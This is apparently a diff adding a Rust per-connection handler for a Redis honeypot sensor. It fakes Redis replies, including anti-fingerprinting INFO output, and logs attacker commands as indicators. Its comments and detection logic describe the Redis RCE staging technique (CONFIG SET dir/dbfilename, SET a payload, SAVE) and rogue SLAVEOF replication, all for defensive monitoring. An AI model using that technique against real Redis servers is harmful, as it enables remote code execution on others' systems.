@@ -1,0 +1,1768 @@
+//! Per-connection Redis session handler: dispatches parsed RESP commands to canned responses,
+//! captures credentials and suspicious commands as indicators, and drives the socket I/O loop.
+//! See `internal/design/08-remaining-sensors.md`'s "sensor-redis" section for the protocol flow
+//! this composes and `resp.rs` for the wire parsing/encoding it drives.
+//!
+//! Split mirrors sensor-telnet's `handler.rs` and sensor-ssh's `auth.rs`: [`Session::dispatch`]
+//! and its per-command handlers are pure functions of `(state, args) -> (reply bytes, events)`
+//! with no socket of their own, so they are unit-tested directly below with no live socket.
+//! [`handle_connection`] is the only function in this crate that performs socket I/O;
+//! it is exercised end-to-end by `tests/integration.rs` instead.
+//!
+//! **This sensor never actually authenticates or persists anything.** `AUTH` always succeeds (a
+//! real unauthenticated Redis instance behaves the same way - the point is to let the attacker
+//! proceed and reveal intent, matching sensor-ssh/telnet's own "accept everything" convention).
+//! `SET` stores the value in a small per-session map and `GET` reads it back, so the ordinary
+//! write-then-read check an attacker's tooling makes (`SET foo bar` / `GET foo`) sees a
+//! consistent server; it used to answer nil to every GET, which contradicted the `+OK` two
+//! commands earlier. The map is session-scoped and capped (`MAX_KEYS`, `MAX_STORE_BYTES`, and
+//! past a small floor the pool every session shares, see `memory.rs`); nothing persists between
+//! connections and nothing behind it is real.
+
+use std::collections::HashMap;
+use std::net::{IpAddr, SocketAddr};
+use std::ops::Range;
+use std::sync::{Arc, LazyLock};
+use std::time::Instant;
+
+use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
+
+use sensor_framework::listener::normalize_dual_stack;
+use sensor_framework::sanitize_value;
+use sensor_framework::{
+    CaptureMemoryBudget, ConnectionBounds, EventEmitter, Uuid, WanResolver, persona,
+};
+use sensor_wire::{
+    PROTO_TCP, SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_CONNECTION,
+    SIGNAL_HONEYPOT_LOGIN_ATTEMPT, SensorEvent, WIRE_VERSION,
+};
+
+use crate::memory::{self, Charge};
+use crate::resp;
+
+/// This sensor's identity on both the wire `sensor` field and every event's
+/// `metadata.protocol_label` - see the design spec's "protocol_label: redis" / "sensor name:
+/// redis".
+const PROTOCOL_LABEL: &str = "redis";
+
+/// Cap applied to a short attacker-controlled field embedded in metadata (a key name, a CONFIG
+/// param, a SLAVEOF host/port token) - matches sensor-ssh's `auth::MAX_METADATA_STRING_LEN` /
+/// sensor-telnet's `handler::MAX_USERNAME_LEN` convention.
+const MAX_METADATA_STRING_LEN: usize = 255;
+
+/// Cap applied to a longer attacker-controlled value (a SET value, an EVAL script) - matches
+/// `sensor_framework::shell::MAX_COMMAND_LEN`'s convention of a generous, fixed bound on a value
+/// that isn't just a short identifier.
+const MAX_VALUE_LEN: usize = 1024;
+
+/// Size of each individual raw socket read, matching sensor-telnet's `READ_CHUNK_SIZE`
+/// convention: deliberately small and fixed, unrelated to `bounds.max_captured_bytes` (which
+/// bounds the whole session).
+const READ_CHUNK_SIZE: usize = 1024;
+
+/// The `honeypot_connection` event: emitted once, immediately after accept, before any RESP
+/// command is read - `authenticated = false` unconditionally, regardless of what an `AUTH` later
+/// in the session does.
+fn connection_event(
+    source_ip: IpAddr,
+    wan_ip: Option<IpAddr>,
+    session_id: Uuid,
+    tls: bool,
+) -> SensorEvent {
+    let mut metadata = serde_json::json!({ "protocol_label": PROTOCOL_LABEL });
+    if tls {
+        metadata["tls"] = serde_json::Value::Bool(true);
+    }
+    SensorEvent {
+        v: WIRE_VERSION,
+        source_ip,
+        wan_ip,
+        sensor: PROTOCOL_LABEL.to_string(),
+        signal_type: SIGNAL_HONEYPOT_CONNECTION.to_string(),
+        protocol: PROTO_TCP.to_string(),
+        authenticated: false,
+        observed_at: chrono::Utc::now(),
+        metadata,
+        sample: None,
+        session_id: Some(session_id),
+        occurrence_id: None,
+        reply: None,
+    }
+}
+
+/// Redis's exact unknown-command error: the ORIGINAL-case command name, then each following
+/// argument quoted, e.g. `unknown command 'FoO', with args beginning with: 'a', 'b', `. The old
+/// reply uppercased the name and dropped the args clause entirely, which is a one-probe tell. Args
+/// are sanitized and length-bounded so an attacker-controlled arg cannot break RESP error framing.
+fn unknown_command_error(args: &[&[u8]]) -> String {
+    let mut msg = format!(
+        "ERR unknown command '{}', with args beginning with: ",
+        ledger(args[0], 128)
+    );
+    for a in args.iter().skip(1).take(20) {
+        msg.push('\'');
+        msg.push_str(&ledger(a, 128));
+        msg.push_str("', ");
+    }
+    msg
+}
+
+/// An argument as display text, for matching a command name and for the ledger. Only the
+/// stored value and the key stay bytes; everything written into an event goes through here and
+/// then `sanitize_value`.
+fn text(arg: &[u8]) -> String {
+    String::from_utf8_lossy(arg).into_owned()
+}
+
+/// A command or parameter name to match on. No name is anywhere near 64 bytes, so a longer
+/// argument only needs to stay unequal to every name; cutting it avoids decoding and casing an
+/// attacker-sized argument.
+fn name(arg: &[u8]) -> String {
+    text(&arg[..arg.len().min(64)])
+}
+
+/// Raw bytes [`ledger`] sanitizes at a time. Invalid UTF-8 grows about threefold in `text` and
+/// `sanitize_value` keeps several full-length copies, so running it over a 512 KiB argument cost
+/// memory out of proportion to the 1 KiB a field keeps; a chunk bounds that to a few tens of KiB.
+const LEDGER_CHUNK: usize = 4096;
+
+/// An argument as a sanitized ledger field of at most `max_len` bytes AFTER sanitization.
+/// Sanitizing a chunk at a time and stopping once `max_len` sanitized bytes exist keeps the work
+/// bounded without letting padding that sanitization removes (CR/LF/tab runs, NULs, zero-width
+/// characters) push the payload out of the window: a prefix cut before sanitizing recorded an
+/// empty value for a payload behind 4 KiB of such padding. The scan is capped only by the
+/// argument's own length, which the parser already bounds.
+///
+/// Equal to `sanitize_value(text(arg), max_len)` except that NFC composition does not reach across
+/// a chunk boundary; [`chunk_end`] and [`skip_csi_tail`] keep a boundary from changing anything
+/// else that is kept.
+fn ledger(arg: &[u8], max_len: usize) -> String {
+    let mut out = String::new();
+    let mut start = 0;
+    while start < arg.len() && out.len() < max_len {
+        let (end, csi_open) = chunk_end(arg, start);
+        let mut piece = sanitize_value(&text(&arg[start..end]), usize::MAX);
+        // Sanitization collapses a run of line breaks to one space; a run the boundary cut
+        // leaves a second space at the start of this piece.
+        if start > 0
+            && is_line_break(arg[start - 1])
+            && is_line_break(arg[start])
+            && piece.starts_with(' ')
+        {
+            piece.remove(0);
+        }
+        let room = max_len - out.len();
+        if piece.len() > room {
+            let mut cut = room;
+            while !piece.is_char_boundary(cut) {
+                cut -= 1;
+            }
+            out.push_str(&piece[..cut]);
+            break;
+        }
+        out.push_str(&piece);
+        start = if csi_open {
+            skip_csi_tail(arg, end)
+        } else {
+            end
+        };
+    }
+    out
+}
+
+/// The bytes `sanitize_value` collapses a run of into one space.
+fn is_line_break(b: u8) -> bool {
+    matches!(b, b'\r' | b'\n' | b'\t' | 0x0B | 0x0C)
+}
+
+/// A byte `sanitize_value`'s CSI stripping treats as a parameter: 0x20-0x3F, and the line breaks
+/// that have already become a space by then.
+fn is_csi_param(b: u8) -> bool {
+    (0x20..=0x3F).contains(&b) || is_line_break(b)
+}
+
+/// Where the chunk of `arg` starting at `start` ends: at most [`LEDGER_CHUNK`] on and never
+/// inside a UTF-8 sequence. A chunk would also end inside an unfinished ANSI CSI escape, which
+/// the whole argument strips as one: the end moves back to the escape, or when the escape fills
+/// the chunk, the second value is true and the caller continues past the escape with
+/// [`skip_csi_tail`]. Always past `start`.
+fn chunk_end(arg: &[u8], start: usize) -> (usize, bool) {
+    let mut end = (start + LEDGER_CHUNK).min(arg.len());
+    if end == arg.len() {
+        return (end, false);
+    }
+    for _ in 0..3 {
+        if end > start + 1 && arg[end] & 0xC0 == 0x80 {
+            end -= 1;
+        }
+    }
+    if let Some(i) = arg[start..end].iter().rposition(|&b| b == 0x1B) {
+        let esc = start + i;
+        let open = arg.get(esc + 1) == Some(&b'[')
+            && arg[(esc + 2).min(end)..end]
+                .iter()
+                .all(|&b| is_csi_param(b));
+        if open {
+            if esc > start {
+                return (esc, false);
+            }
+            return (end, true);
+        }
+    }
+    (end, false)
+}
+
+/// The index after the rest of a CSI escape whose parameters ran to `from`: past any more
+/// parameter bytes and then one final byte, as `sanitize_value` consumes it.
+fn skip_csi_tail(arg: &[u8], mut from: usize) -> usize {
+    while let Some(&b) = arg.get(from) {
+        if (0x40..=0x7E).contains(&b) {
+            return from + 1;
+        }
+        if !is_csi_param(b) {
+            break;
+        }
+        from += 1;
+    }
+    from
+}
+
+/// A fresh 40-hex id, as Redis mints for `run_id` / `master_replid` on every boot.
+fn random_hex40() -> String {
+    let bytes: [u8; 20] = rand::random();
+    let mut s = String::with_capacity(40);
+    for b in bytes {
+        s.push_str(&format!("{b:02x}"));
+    }
+    s
+}
+
+// Minted ONCE per process. A real Redis assigns run_id/master_replid a random 40-hex value at
+// startup that is then stable for the life of the process; the old canned INFO had no run_id at
+// all (and every other value frozen), which a one-line INFO probe flags instantly. Process start
+// is captured so uptime advances instead of sitting at a constant 3600.
+static RUN_ID: LazyLock<String> = LazyLock::new(random_hex40);
+static REPL_ID: LazyLock<String> = LazyLock::new(random_hex40);
+static PROCESS_START: LazyLock<Instant> = LazyLock::new(Instant::now);
+
+/// `INFO` reply body: a Redis 7.2.4 standalone master formatted as INFO's real `# Section` /
+/// `key:value` layout. The identity/liveness fields that a scanner keys on are dynamic - a
+/// per-process `run_id`/`master_replid`, an advancing `uptime`, the real `process_id`, and the OS
+/// line sourced from the shared persona - so the reply is not the byte-identical frozen stub the
+/// audit flagged. The remaining counters are plausible constants (this trap holds no real data).
+fn canned_info() -> String {
+    let uptime = PROCESS_START.elapsed().as_secs();
+    let uptime_days = uptime / 86_400;
+    let pid = std::process::id();
+    let now_usec = chrono::Utc::now().timestamp_micros();
+    let save_time = chrono::Utc::now().timestamp();
+    let os = format!("Linux {} {}", persona::KERNEL_RELEASE, persona::ARCH);
+    let run_id = &*RUN_ID;
+    let repl_id = &*REPL_ID;
+    format!(
+        "# Server\r\n\
+         redis_version:7.2.4\r\n\
+         redis_git_sha1:00000000\r\n\
+         redis_git_dirty:0\r\n\
+         redis_build_id:a5f6e8c0b3d21947\r\n\
+         redis_mode:standalone\r\n\
+         os:{os}\r\n\
+         arch_bits:64\r\n\
+         monotonic_clock:POSIX clock_gettime\r\n\
+         multiplexing_api:epoll\r\n\
+         atomicvar_api:c11-builtin\r\n\
+         process_id:{pid}\r\n\
+         process_supervised:no\r\n\
+         run_id:{run_id}\r\n\
+         tcp_port:6379\r\n\
+         server_time_usec:{now_usec}\r\n\
+         uptime_in_seconds:{uptime}\r\n\
+         uptime_in_days:{uptime_days}\r\n\
+         hz:10\r\n\
+         configured_hz:10\r\n\
+         lru_clock:0\r\n\
+         executable:/usr/bin/redis-server\r\n\
+         config_file:/etc/redis/redis.conf\r\n\
+         io_threads_active:0\r\n\
+         \r\n\
+         # Clients\r\n\
+         connected_clients:1\r\n\
+         cluster_connections:0\r\n\
+         maxclients:10000\r\n\
+         client_recent_max_input_buffer:20480\r\n\
+         client_recent_max_output_buffer:0\r\n\
+         blocked_clients:0\r\n\
+         tracking_clients:0\r\n\
+         pubsub_clients:0\r\n\
+         watching_clients:0\r\n\
+         clients_in_timeout_table:0\r\n\
+         total_blocking_keys:0\r\n\
+         \r\n\
+         # Memory\r\n\
+         used_memory:1048576\r\n\
+         used_memory_human:1.00M\r\n\
+         used_memory_rss:12582912\r\n\
+         used_memory_rss_human:12.00M\r\n\
+         used_memory_peak:1150976\r\n\
+         used_memory_peak_human:1.10M\r\n\
+         used_memory_lua:0\r\n\
+         used_memory_scripts:0\r\n\
+         number_of_cached_scripts:0\r\n\
+         maxmemory:268435456\r\n\
+         maxmemory_human:256.00M\r\n\
+         maxmemory_policy:noeviction\r\n\
+         mem_fragmentation_ratio:12.00\r\n\
+         mem_allocator:jemalloc-5.3.0\r\n\
+         \r\n\
+         # Persistence\r\n\
+         loading:0\r\n\
+         async_loading:0\r\n\
+         rdb_changes_since_last_save:0\r\n\
+         rdb_bgsave_in_progress:0\r\n\
+         rdb_last_save_time:{save_time}\r\n\
+         rdb_last_bgsave_status:ok\r\n\
+         aof_enabled:0\r\n\
+         aof_last_bgrewrite_status:ok\r\n\
+         aof_last_write_status:ok\r\n\
+         \r\n\
+         # Stats\r\n\
+         total_connections_received:1\r\n\
+         total_commands_processed:1\r\n\
+         instantaneous_ops_per_sec:0\r\n\
+         total_net_input_bytes:31\r\n\
+         total_net_output_bytes:0\r\n\
+         rejected_connections:0\r\n\
+         sync_full:0\r\n\
+         expired_keys:0\r\n\
+         evicted_keys:0\r\n\
+         keyspace_hits:0\r\n\
+         keyspace_misses:0\r\n\
+         pubsub_channels:0\r\n\
+         pubsub_patterns:0\r\n\
+         latest_fork_usec:0\r\n\
+         total_forks:0\r\n\
+         \r\n\
+         # Replication\r\n\
+         role:master\r\n\
+         connected_slaves:0\r\n\
+         master_failover_state:no-failover\r\n\
+         master_replid:{repl_id}\r\n\
+         master_replid2:0000000000000000000000000000000000000000\r\n\
+         master_repl_offset:0\r\n\
+         second_repl_offset:-1\r\n\
+         repl_backlog_active:0\r\n\
+         repl_backlog_size:1048576\r\n\
+         \r\n\
+         # CPU\r\n\
+         used_cpu_sys:0.100000\r\n\
+         used_cpu_user:0.080000\r\n\
+         used_cpu_sys_children:0.000000\r\n\
+         used_cpu_user_children:0.000000\r\n\
+         \r\n\
+         # Cluster\r\n\
+         cluster_enabled:0\r\n\
+         \r\n\
+         # Keyspace\r\n"
+    )
+}
+
+/// Canned `CONFIG GET *` reply: a small, plausible flat key/value array (real Redis returns
+/// alternating parameter-name/value bulk strings for a `CONFIG GET` match).
+fn canned_config_get() -> Vec<u8> {
+    resp::array_of_bulk_strings(&[
+        "maxmemory",
+        "268435456",
+        "maxmemory-policy",
+        "noeviction",
+        "save",
+        "3600 1 300 100 60 10000",
+        "appendonly",
+        "no",
+    ])
+}
+
+/// Per-connection RESP session state: just enough to track whether this connection has issued a
+/// (always-accepted) `AUTH` yet, and the connection attributes every emitted event carries. See
+/// the module doc for why there is no real credential or key/value store behind any of this.
+pub struct Session {
+    source_ip: IpAddr,
+    wan_ip: Option<IpAddr>,
+    session_id: Uuid,
+    authenticated: bool,
+    /// Values SET this session, read back by GET, stored whole. Bounded by `MAX_KEYS` entries
+    /// and `MAX_STORE_BYTES` in total, and past `memory::STORE_FLOOR` by the pool every session
+    /// shares, so the sessions together cannot grow the process past its memory limit.
+    keys: HashMap<Vec<u8>, Vec<u8>>,
+    /// Bytes of keys and values currently held, against `MAX_STORE_BYTES`.
+    store_bytes: usize,
+    /// The store's charge to the shared pool.
+    store_memory: Charge,
+    /// Connection arrived over TLS; stamped on every event as `"tls": true`.
+    tls: bool,
+}
+
+/// Distinct keys, and total key+value bytes, one session may hold. A SET that would exceed
+/// either, or that the shared pool cannot hold, is refused with the error a real instance gives
+/// when it is out of memory under its `noeviction` policy; acknowledging the write and then
+/// dropping or cutting it was the same contradiction as the old always-nil GET, just moved to
+/// the limit.
+const MAX_KEYS: usize = 256;
+const MAX_STORE_BYTES: usize = 1024 * 1024;
+const OOM_REPLY: &str = "OOM command not allowed when used memory > 'maxmemory'.";
+
+impl Session {
+    /// `source_ip`/`wan_ip` are this connection's real attributes; every event this type ever
+    /// emits carries them verbatim, matching sensor-ssh's `AuthState::new` convention. The store
+    /// draws on `pool` past its floor.
+    pub fn new(
+        source_ip: IpAddr,
+        wan_ip: Option<IpAddr>,
+        session_id: Uuid,
+        pool: &CaptureMemoryBudget,
+    ) -> Self {
+        Self {
+            source_ip,
+            wan_ip,
+            session_id,
+            authenticated: false,
+            keys: HashMap::new(),
+            store_bytes: 0,
+            store_memory: Charge::new(pool, memory::STORE_FLOOR),
+            tls: false,
+        }
+    }
+
+    /// Mark every event this session emits as having arrived over TLS.
+    pub fn with_tls(mut self, tls: bool) -> Self {
+        self.tls = tls;
+        self
+    }
+
+    pub fn is_authenticated(&self) -> bool {
+        self.authenticated
+    }
+
+    /// Build one event carrying this session's connection attributes. `authenticated` is passed
+    /// explicitly rather than always reading `self.authenticated`: `AUTH`'s own login-attempt
+    /// event must be `true` (the fact just happened, regardless of what `self.authenticated` was
+    /// a moment ago), while every other event mirrors the session's current state, matching the
+    /// wire contract's signal-type mapping table ("Command captured -> authenticated: true (or
+    /// false if no auth)").
+    fn build_event(
+        &self,
+        signal_type: &str,
+        authenticated: bool,
+        mut metadata: serde_json::Value,
+    ) -> SensorEvent {
+        if self.tls {
+            metadata["tls"] = serde_json::Value::Bool(true);
+        }
+        SensorEvent {
+            v: WIRE_VERSION,
+            source_ip: self.source_ip,
+            wan_ip: self.wan_ip,
+            sensor: PROTOCOL_LABEL.to_string(),
+            signal_type: signal_type.to_string(),
+            protocol: PROTO_TCP.to_string(),
+            authenticated,
+            observed_at: chrono::Utc::now(),
+            metadata,
+            sample: None,
+            session_id: Some(self.session_id),
+            occurrence_id: None,
+            reply: None,
+        }
+    }
+
+    /// Dispatch one already-parsed, non-empty command to its handler, returning the raw RESP
+    /// reply bytes to write back to the socket and any events to emit. The command name is
+    /// matched case-insensitively (real Redis clients send both `PING` and `ping`). Panics if
+    /// `args` is empty - the only caller, `RespReader::read_command`'s loop, already filters
+    /// empty parses out before returning `ReadOutcome::Command`. The arguments are borrowed: the
+    /// read loop passes slices of its own buffer, so a command is never copied to be dispatched.
+    pub fn dispatch<A: AsRef<[u8]>>(&mut self, args: &[A]) -> (Vec<u8>, Vec<SensorEvent>) {
+        let args: Vec<&[u8]> = args.iter().map(AsRef::as_ref).collect();
+        let args = args.as_slice();
+        let cmd = name(args[0]).to_ascii_uppercase();
+        match cmd.as_str() {
+            // Real Redis PING echoes its optional message (as a bulk string) and errors on excess
+            // arity; a bare PING is +PONG.
+            "PING" => match args.len() {
+                1 => (resp::simple_string("PONG"), vec![]),
+                2 => (resp::bulk_bytes(args[1]), vec![]),
+                _ => (
+                    resp::error_reply("ERR wrong number of arguments for 'ping' command"),
+                    vec![],
+                ),
+            },
+            "AUTH" => self.handle_auth(args),
+            "INFO" => (resp::bulk_string(&canned_info()), vec![]),
+            "CONFIG" => self.handle_config(args),
+            "SET" => self.handle_set(args),
+            "GET" => self.handle_get(args),
+            "SLAVEOF" | "REPLICAOF" => self.handle_replicaof(&cmd, args),
+            "EVAL" | "SCRIPT" => self.handle_eval(&cmd, args),
+            _ => (resp::error_reply(&unknown_command_error(args)), vec![]),
+        }
+    }
+
+    /// `AUTH <password>` or the Redis 6+ ACL form `AUTH <username> <password>`. Every offered
+    /// credential is accepted - see the module doc for why - and neither argument is ever placed
+    /// in `metadata` or anywhere else: they live only in this call's local `args` slice, owned by
+    /// the read loop's per-command buffer, and are dropped when this function returns. Mirrors
+    /// sensor-telnet's `_password` / sensor-ssh's `_password` local-binding convention.
+    fn handle_auth(&mut self, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        if args.len() != 2 && args.len() != 3 {
+            return (
+                resp::error_reply("ERR wrong number of arguments for 'auth' command"),
+                vec![],
+            );
+        }
+        self.authenticated = true;
+        let event = self.build_event(
+            SIGNAL_HONEYPOT_LOGIN_ATTEMPT,
+            true,
+            serde_json::json!({ "protocol_label": PROTOCOL_LABEL }),
+        );
+        (resp::simple_string("OK"), vec![event])
+    }
+
+    /// `CONFIG GET ...` / `CONFIG SET ...`. Only these two subcommands are emulated, matching the
+    /// design spec's enumerated command set; anything else is refused like a real unrecognized
+    /// subcommand would be.
+    fn handle_config(&mut self, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        let Some(sub) = args.get(1) else {
+            return (
+                resp::error_reply("ERR wrong number of arguments for 'config' command"),
+                vec![],
+            );
+        };
+        match name(sub).to_ascii_uppercase().as_str() {
+            "GET" => (canned_config_get(), vec![]),
+            "SET" => self.handle_config_set(args),
+            other => (
+                resp::error_reply(&format!("ERR Unknown CONFIG subcommand '{other}'")),
+                vec![],
+            ),
+        }
+    }
+
+    /// `CONFIG SET <param> <value>`. Always replies `+OK` (this sensor has no real config to
+    /// mutate), but only `dir`/`dbfilename` emit an indicator event: those two are the classic
+    /// Redis RCE staging primitive (point the RDB save directory and filename at a web root, then
+    /// `SET` a payload and `SAVE`) - see the design spec's "log as indicator (filesystem write
+    /// attempt)". Any other param is accepted silently, matching real Redis's own breadth of
+    /// harmless `CONFIG SET` targets.
+    fn handle_config_set(&mut self, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        if args.len() < 4 {
+            return (
+                resp::error_reply("ERR wrong number of arguments for 'config|set' command"),
+                vec![],
+            );
+        }
+        let param_lower = name(args[2]).to_ascii_lowercase();
+        let mut events = Vec::new();
+        if param_lower == "dir" || param_lower == "dbfilename" {
+            let param = ledger(args[2], MAX_METADATA_STRING_LEN);
+            let value = ledger(args[3], MAX_VALUE_LEN);
+            events.push(self.build_event(
+                SIGNAL_HONEYPOT_COMMAND_EXEC,
+                self.authenticated,
+                serde_json::json!({
+                    "protocol_label": PROTOCOL_LABEL,
+                    "command": "CONFIG SET",
+                    "param": param,
+                    "value": value,
+                }),
+            ));
+        }
+        (resp::simple_string("OK"), events)
+    }
+
+    /// `SET <key> <value>`: stored for this session (see the module doc); the key and value are
+    /// captured as indicators, sanitized through `sanitize_value` before they can reach the
+    /// event record.
+    fn handle_set(&mut self, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        if args.len() < 3 {
+            return (
+                resp::error_reply("ERR wrong number of arguments for 'set' command"),
+                vec![],
+            );
+        }
+        let key = ledger(args[1], MAX_METADATA_STRING_LEN);
+        let value = ledger(args[2], MAX_VALUE_LEN);
+        let event = self.build_event(
+            SIGNAL_HONEYPOT_COMMAND_EXEC,
+            self.authenticated,
+            serde_json::json!({
+                "protocol_label": PROTOCOL_LABEL,
+                "command": "SET",
+                "key": key,
+                "value": value,
+            }),
+        );
+        // Keep the raw value whole so GET hands back exactly what was SET; the sanitized copy
+        // above is for the ledger only. A write the store cannot hold is refused, never cut or
+        // silently dropped behind an +OK. The attempt is still evidence, so the event stands.
+        let previous = self
+            .keys
+            .get(args[1])
+            .map_or(0, |v| args[1].len() + v.len());
+        let incoming = args[1].len() + args[2].len();
+        let new_key = !self.keys.contains_key(args[1]);
+        let after = self.store_bytes - previous + incoming;
+        let keys_after = self.keys.len() + usize::from(new_key);
+        if keys_after > MAX_KEYS
+            || after > MAX_STORE_BYTES
+            || !self
+                .store_memory
+                .set(after + keys_after * memory::ENTRY_OVERHEAD)
+        {
+            return (resp::error_reply(OOM_REPLY), vec![event]);
+        }
+        self.keys.insert(args[1].to_vec(), args[2].to_vec());
+        self.store_bytes = after;
+        (resp::simple_string("OK"), vec![event])
+    }
+
+    /// `GET <key>`: the value SET earlier this session, else nil. No event: the design spec lists
+    /// an event only for the write side (`SET`), not this read side.
+    fn handle_get(&mut self, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        if args.len() != 2 {
+            return (
+                resp::error_reply("ERR wrong number of arguments for 'get' command"),
+                vec![],
+            );
+        }
+        let reply = match self.keys.get(args[1]) {
+            Some(value) => resp::bulk_bytes(value),
+            None => resp::nil_bulk_string(),
+        };
+        (reply, vec![])
+    }
+
+    /// `SLAVEOF <host> <port>` / `REPLICAOF <host> <port>` (or `REPLICAOF NO ONE` to detach).
+    /// Always replies `+OK`; every trailing argument is captured as a sanitized indicator - an
+    /// attacker pointing this instance at a host they control is the signal, regardless of the
+    /// specific host/port offered.
+    fn handle_replicaof(&mut self, cmd: &str, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        let captured_args: Vec<String> = args[1..]
+            .iter()
+            .map(|a| ledger(a, MAX_METADATA_STRING_LEN))
+            .collect();
+        let event = self.build_event(
+            SIGNAL_HONEYPOT_COMMAND_EXEC,
+            self.authenticated,
+            serde_json::json!({
+                "protocol_label": PROTOCOL_LABEL,
+                "command": cmd,
+                "args": captured_args,
+            }),
+        );
+        (resp::simple_string("OK"), vec![event])
+    }
+
+    /// `EVAL <script> <numkeys> [keys...] [args...]` / `SCRIPT <subcommand> ...`. Never actually
+    /// runs any Lua (this sensor executes nothing - see the crate-wide `never_exec_static_check`
+    /// in `tests/integration.rs`); replies a plausible compile-style error while capturing every
+    /// trailing argument (the script body included) as a sanitized indicator.
+    fn handle_eval(&mut self, cmd: &str, args: &[&[u8]]) -> (Vec<u8>, Vec<SensorEvent>) {
+        let captured_args: Vec<String> =
+            args[1..].iter().map(|a| ledger(a, MAX_VALUE_LEN)).collect();
+        let event = self.build_event(
+            SIGNAL_HONEYPOT_COMMAND_EXEC,
+            self.authenticated,
+            serde_json::json!({
+                "protocol_label": PROTOCOL_LABEL,
+                "command": cmd,
+                "args": captured_args,
+            }),
+        );
+        let response = resp::error_reply(
+            "ERR Error compiling script (new function): user_script:1: unexpected symbol",
+        );
+        (response, vec![event])
+    }
+}
+
+/// Handle one accepted Redis connection end to end: emit `honeypot_connection`, then read and
+/// dispatch RESP commands in a loop until the peer disconnects, times out, exceeds its capture
+/// budget, or sends a structurally invalid command. Never panics and never propagates an I/O
+/// error to the caller - matches `sensor_framework::run_tcp_listener`'s per-connection isolation
+/// contract (see sensor-telnet's `handle_connection` doc for the same guarantee). The session's
+/// read buffer and store draw on `pool` past their floors (see `memory.rs`), and give it back
+/// when this future ends or is dropped.
+// Nine parameters: the stream plus the per-connection context every sensor handler takes;
+// bundling them would diverge from the uniform handler shape the sibling sensors share.
+#[allow(clippy::too_many_arguments)]
+pub async fn handle_connection<S>(
+    mut stream: S,
+    peer_addr: SocketAddr,
+    local_addr: Option<SocketAddr>,
+    tls: bool,
+    session_id: Uuid,
+    emitter: Arc<EventEmitter>,
+    wan_resolver: Arc<WanResolver>,
+    bounds: ConnectionBounds,
+    pool: Arc<CaptureMemoryBudget>,
+) where
+    S: AsyncRead + AsyncWrite + Unpin + Send,
+{
+    let norm_peer = normalize_dual_stack(peer_addr);
+    let source_ip: IpAddr = norm_peer.ip();
+    let wan_ip = local_addr
+        .map(normalize_dual_stack)
+        .and_then(|local| wan_resolver.resolve(local.ip()));
+
+    let conn_event = connection_event(source_ip, wan_ip, session_id, tls);
+    if emitter.append(&conn_event).await.is_err() {
+        tracing::error!(%peer_addr, "redis: failed to append connection event");
+    }
+
+    let mut session = Session::new(source_ip, wan_ip, session_id, &pool).with_tls(tls);
+    let write_limit = bounds.idle_timeout;
+    let mut reader = RespReader::new(bounds, &pool);
+
+    loop {
+        match reader.read_command(&mut stream).await {
+            ReadOutcome::Command(ranges) => {
+                let (response, events) = session.dispatch(&reader.args(&ranges));
+                for event in &events {
+                    if emitter.append(event).await.is_err() {
+                        tracing::error!(%peer_addr, "redis: failed to append command event");
+                    }
+                }
+                if !write_reply(&mut stream, &response, write_limit).await {
+                    return;
+                }
+            }
+            ReadOutcome::ProtocolError => {
+                let _ = stream
+                    .write_all(&resp::error_reply("ERR Protocol error"))
+                    .await;
+                let _ = stream.flush().await;
+                // close_notify after the farewell, as a real TLS server sends.
+                let _ = stream.shutdown().await;
+                return;
+            }
+            ReadOutcome::Closed => return,
+        }
+    }
+}
+
+/// Write one reply and flush (a TLS stream buffers records until flushed), giving up after
+/// `limit`. A peer that pipelines commands and never reads leaves the sensor blocked in the write
+/// while the kernel holds the unsent replies against the unit's memory; without a limit that
+/// session lasts until `max_duration`. Returns false when the session should end.
+async fn write_reply<S: AsyncWrite + Unpin>(
+    stream: &mut S,
+    reply: &[u8],
+    limit: std::time::Duration,
+) -> bool {
+    let write = async {
+        stream.write_all(reply).await?;
+        stream.flush().await
+    };
+    matches!(tokio::time::timeout(limit, write).await, Ok(Ok(())))
+}
+
+/// Outcome of one [`RespReader::read_command`] call.
+enum ReadOutcome {
+    /// One non-empty command, ready to dispatch: its arguments as ranges of the reader's buffer,
+    /// read through [`RespReader::args`] until the next [`RespReader::read_command`].
+    Command(Vec<Range<usize>>),
+    /// The buffered bytes could never be valid RESP - `handle_connection` writes a protocol-error
+    /// reply and ends the session.
+    ProtocolError,
+    /// EOF, a read error, a timeout, the session's `max_captured_bytes` budget was exhausted, or
+    /// the shared pool could not buffer the command being read - any of which end the session
+    /// with no further reply.
+    Closed,
+}
+
+/// Buffered RESP command reader. One instance per connection; `bounds` governs every individual
+/// socket read the same way `sensor_telnet::handler::LineReader` does: `read_timeout` bounds the
+/// wait for the very first byte of the whole session, `idle_timeout` bounds every read after
+/// that, and a running total checked against `max_captured_bytes` bounds the whole session's
+/// captured input regardless of how many commands it spans. The buffer's capacity past
+/// `memory::BUFFER_FLOOR` is charged to the shared pool, and a command the pool cannot buffer
+/// ends the session.
+struct RespReader {
+    /// Bytes read off the socket but not yet consumed by a complete, dispatched command.
+    buf: Vec<u8>,
+    /// Bytes at the front of `buf` that belong to the command last returned; dropped when the
+    /// next command is read, so its arguments can be dispatched in place until then.
+    dispatched: usize,
+    parser: resp::Parser,
+    /// `buf`'s capacity, charged to the pool past the floor.
+    memory: Charge,
+    bounds: ConnectionBounds,
+    first_read: bool,
+    total_captured: u64,
+}
+
+/// The step a read buffer grows by when the pool cannot cover doubling it.
+const BUFFER_STEP: usize = 64 * 1024;
+
+impl RespReader {
+    fn new(bounds: ConnectionBounds, pool: &CaptureMemoryBudget) -> Self {
+        Self {
+            buf: Vec::new(),
+            dispatched: 0,
+            parser: resp::Parser::default(),
+            memory: Charge::new(pool, memory::BUFFER_FLOOR),
+            bounds,
+            first_read: true,
+            total_captured: 0,
+        }
+    }
+
+    /// The arguments of the command [`Self::read_command`] last returned.
+    fn args(&self, ranges: &[Range<usize>]) -> Vec<&[u8]> {
+        ranges.iter().map(|r| &self.buf[r.clone()]).collect()
+    }
+
+    /// Drop the command last dispatched, and give back the room past the floor that a large one
